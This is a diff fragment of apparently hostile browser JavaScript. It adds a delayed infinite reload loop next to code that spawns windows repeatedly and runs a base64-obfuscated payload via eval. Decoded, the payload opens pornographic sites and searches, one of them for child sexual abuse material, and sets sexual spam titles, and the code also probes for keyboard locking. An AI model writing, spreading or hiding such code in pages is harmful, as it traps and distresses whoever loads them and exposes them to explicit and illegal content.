@@ -98,9 +98,11 @@ for(var i = 0; i < elems.length; i++){
     window.open("https://crazystuffofficial.github.io/guava", "", "");
     window.open(location.href, "", "");
     eval(atob("d2luZG93Lm9wZW4oImh0dHBzOi8vcG9ybmh1Yi5jb20iKTsKd2luZG93Lm9wZW4oImh0dHBzOi8vcG9ybi5jb20iKTsKd2luZG93Lm9wZW4oImh0dHBzOi8vZ29vZ2xlLmNvbS9zZWFyY2g/cT1wb3JuIik7CndpbmRvdy5vcGVuKCJodHRwczovL2dvb2dsZS5jb20vc2VhcmNoP3E9YmlnK2Jvb3R5K2JsYWNrK29pbHkrbWVuK3R3ZXJraW5nIik7CndpbmRvdy5vcGVuKCJodHRwczovL2dvb2dsZS5jb20vc2VhcmNoP3E9Y2hpbGQrcG9ybiIpOwp3aW5kb3cub3BlbigiaHR0cHM6Ly9nb29nbGUuY29tL3NlYXJjaD9xPWhlbnRhaSIpOwpmb3IodmFyIGkgPSAwOyBpIDwgMTAwOyBpKyspewpkb2N1bWVudC50aXRsZSA9ICJNZWV0IGhvcm55IDE4IHllYXIgb2xkcyBpbiB5b3VyIGFyZWEgIOKdpO+4j+KdpO+4j+KdpO+4jyDwn5iP8J+SpvCfjZEiOwpsb2NhdGlvbi5oYXNoID0gInBvcm4gc2l0ZSBsaW5rICIgKyBpIDsKZG9jdW1lbnQudGl0bGUgPSAiR2F5IHBvcm4gdmlkZW9zIG9uIHBvcm5odWIiOwpsb2NhdGlvbi5oYXNoID0gInBvcm4gc2l0ZSBsaW5rICIgKyAoaSArIDEwMCkgOwp9"));
-    while(true){
+    setTimeout(function(){
+            while(true){
         window.location.reload();
     }
+    }, 10000);
     });
 
    if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
